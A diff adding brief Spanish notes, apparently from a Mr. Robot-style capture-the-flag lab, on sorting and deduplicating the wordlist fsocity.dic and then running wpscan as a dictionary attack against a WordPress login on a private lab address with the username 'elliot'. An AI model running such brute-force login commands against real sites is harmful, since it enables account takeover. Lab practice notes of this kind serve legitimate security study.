@@ -1,0 +1,7 @@
+para ordenar un fichero y quitar los duplicados:
+
+wc -l fsocity.dic -> cuenta las filas
+cat fsocity.dic | sort | uniq > fsociety_filtered.txt -> crea un nuevo fichero ordenado y sin repetir palabras
+
+ejecutar un dictionary attack sobre un wordpress:
+wpscan --url http://192.168.1.72 --wordlist=/root/Descargas/fsociety_filtered.txt --username elliot --threads 20
